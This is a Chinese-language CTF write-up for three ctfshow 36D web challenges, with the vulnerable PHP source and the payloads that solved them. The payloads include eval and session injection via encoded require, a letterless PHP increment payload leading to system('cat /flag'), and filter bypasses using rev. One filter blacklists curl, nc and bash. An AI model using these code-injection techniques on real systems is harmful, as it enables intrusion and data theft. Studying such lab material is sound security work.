---
title: ctfshow 36D web
date: 2020-10-30 23:09:11
categories: CTF做题记录
---

<!-- TOC -->

- [给你shell](#给你shell)
- [你取吧](#你取吧)
- [WUSTCTF_朴实无华_Revenge](#wustctf_朴实无华_revenge)

<!-- /TOC -->

<!--more-->
# 给你shell
>JSON伪造、RCE

源码：
```php
//分析来自：https://blog.csdn.net/qq_45628145/article/details/106291794
<?php
//It's no need to use scanner. Of course if you want, but u will find nothing.
error_reporting(0);
include "config.php";

if (isset($_GET['view_source'])) {
    show_source(__FILE__);
    die;
}

function checkCookie($s) {
    $arr = explode(':', $s); // 把s以:分割成数组
    if ($arr[0] === '{"secret"' && preg_match('/^[\"0-9A-Z]*}$/', $arr[1]) && count($arr) === 2 ) {
        return true;    // 检查$arr[1]是否由数字和英文字母A-Z还有"组成
    } else {
        if ( ! theFirstTimeSetCookie() ) setcookie('secret', '', time()-1);
        return false;
    }
}

function haveFun($_f_g) {
    $_g_r = 32;
    $_m_u = md5($_f_g); // md5加密
    $_h_p = strtoupper($_m_u); // 转成大写
    for ($i = 0; $i < $_g_r; $i++) {
        $_i = substr($_h_p, $i, 1);  // 从第一位开始，一个一个的取
        $_i = ord($_i); //返回 $_i 的 ASCII值：
        print_r($_i & 0xC0);  // 按位与运算11000000   数字都会变成1输出，而字母都会变成0输出
    }
    die;
}
// 如果没有按位与运算的话，可以把输出的ASCII值返回成字符串再md5解密一下


isset($_COOKIE['secret']) ? $json = $_COOKIE['secret'] : setcookie('secret', '{"secret":"' . strtoupper(md5('y1ng')) . '"}', time()+7200 );
checkCookie($json) ? $obj = @json_decode($json, true) : die('no');
// 判断有无secret 
// 通过secret赋值给$json，再通过$json建立$obj
// json_decode() 将json格式的数据转换为对象，数组，转换为数组要加true
// json的secret需要满足 checkCookie($s) 里面的条件


if ($obj && isset($_GET['give_me_shell'])) {
    ($obj['secret'] != $flag_md5 ) ? haveFun($flag) : echo "here is your webshell: $shell_path";
}
/*要让传入的secret为 $flag_md5，这里就存在漏洞了，利用php的弱类型比较，但是这里又有个问题，在json_decode()返回""里面的内
容是字符串，就不能进行弱类型比较了，但是如果里面的内容，比如数字，没有被""括起来，返回的就是个int整数，所以注意把""删去，也
就是{"secret":123}，这里开始没注意到还被坑了，一直没有爆破出来
*/
die;
```
haveFun()是做&运算，如果是数字和0xC0来&结果就是0，如果是字母则结果是64，根据主页给出的前三位都是0可得是3位数的弱类型，因为是弱比较，只需爆破这个三位数，得出115
```php
<?php
error_reporting(0);
session_start();

//there are some secret waf that you will never know, fuzz me if you can
require "hidden_filter.php";

if (!$_SESSION['login'])
    die('<script>location.href=\'./index.php\'</script>');

if (!isset($_GET['code'])) {
    show_source(__FILE__);
    exit();
} else {
    $code = $_GET['code'];
    if (!preg_match($secret_waf, $code)) {
        //清空session 从头再来
        eval("\$_SESSION[" . $code . "]=false;"); //you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker
    } else die('hacker');
}

/*
 * When you feel that you are lost, do not give up, fight and move on.
 * Being a hacker is not easy, it requires effort and sacrifice.
 * But remember … we are legion!
 *  ————Deep CTF 2020
*/
```
fuzz过滤挺多，括号、引号、分号，常用函数等，不过`~`没waf，payload：`?code=]=1?><?=require~%d0%99%93%9e%98%d1%8b%87%8b?>`\
(payload解析摘自Y1ng:https://www.gem-love.com/ctf/2283.html)
- 首先用]=1来把session给闭合了
- 分号作为PHP语句的结尾，起到表示语句结尾和语句间分隔的作用，而对于php的单行模式是不需要分号的，因此用?><?来bypass分号
- 没有括号 使用那些不需要括号的函数 这里使用require
- 没有引号表示不能自己传参数，这里使用取反运算
- 由于PHP黑魔法 require和取反运算符之间不需要空格照样执行

# 你取吧

```php
<?php
error_reporting(0);
show_source(__FILE__);
$hint=file_get_contents('php://filter/read=convert.base64-encode/resource=hhh.php');
$code=$_REQUEST['code'];
$_=array('a','b','c','d','e','f','g','h','i','j','k','m','n','l','o','p','q','r','s','t','u','v','w','x','y','z','\~','\^');
$blacklist = array_merge($_);
foreach ($blacklist as $blacklisted) {
    if (preg_match ('/' . $blacklisted . '/im', $code)) {
        die('nonono');
    }
}
eval("echo($code);");
?>
```
直接用P神的payload一把梭，先闭合echo，在注释掉后面的，URL编码一下在提交
```
?code=" ");$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);//
```
再POST提交`_=system('cat /flag');`\
更多思路参考[此博客](https://www.blacknight.top/2020/07/08/CTFshow_36D_wp/#%E4%BD%A0%E5%8F%96%E5%90%A7)

- 未过滤`$`和`[]`，取数组内的字母，如`$_[13]$_[18] /`为`ls /`，也需要闭合echo在使用\
php内使用反引号可以直接调用shell命令，所以直接用
?code=\`$_[13]$_[18]\`
![\`](https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.5u1pn0v44o7.png)
![`ls`](https://raw.githubusercontent.com/yq1ng/blog/master/%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image.stq63wypcj.png)

# WUSTCTF_朴实无华_Revenge
```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

function isPalindrome($str){
    $len=strlen($str);
    $l=1;
    $k=intval($len/2)+1;
    for($j=0;$j<$k;$j++)
        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) {
            $l=0;
            break;
        }
    if ($l==1) return true;
    else return false;
}

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    $numPositve = intval($num);
    $numReverse = intval(strrev($num));//strrev()逆序函数
    if (preg_match('/[^0-9.-]/', $num)) {
        die("非洲欢迎你1");
    }
    if ($numPositve <= -999999999999999999 || $numPositve >= 999999999999999999) { //在64位系统中 intval()的上限不是2147483647 省省吧，此hint说明不是int溢出
        die("非洲欢迎你2");
    }
    if( $numPositve === $numReverse && !isPalindrome($num) ){//矛盾：是回文又不是回文。绕过：100.0010
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//精度问题payload：?num=1000000000000000.00000000000000010
//level 2
if (isset($_GET['md5'])){
    $md5=$_GET['md5'];
    if ($md5==md5(md5($md5)))
        echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
    else
        die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}
//脚本去跑，0e1138100474
//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){//strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。
        $get_flag = str_ireplace("cat", "36dCTFShow", $get_flag);//str_ireplace() 函数替换字符串中的一些字符（不区分大小写）
        $get_flag = str_ireplace("more", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("tail", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("less", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("head", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("tac", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("$", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("sort", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("curl", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("nc", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("bash", "36dCTFShow", $get_flag);
        $get_flag = str_ireplace("php", "36dCTFShow", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```
最后用`ca\t<flag.ph\p`OR`ca\t<f*`等都没读出来，看的Y1ng师傅的还能用`rev</flag|rev`
>rev命令将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，依次类推

level2脚本：
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#__Author__: 颖奇L'Amore www.gem-love.com

import hashlib

for i in range(0,10**33):
    i = str(i)
    num = '0e' + i
    md5 = hashlib.md5(num.encode()).hexdigest()
    md5 = hashlib.md5(md5.encode()).hexdigest()
    # print(md5)
    if md5[0:2] == '0e' and md5[2:].isdigit():
        print('success str:{}  md5(str):{}'.format(num, md5))
        break
    else:
        if int(i) % 1000000 == 0:
         print(i)
```
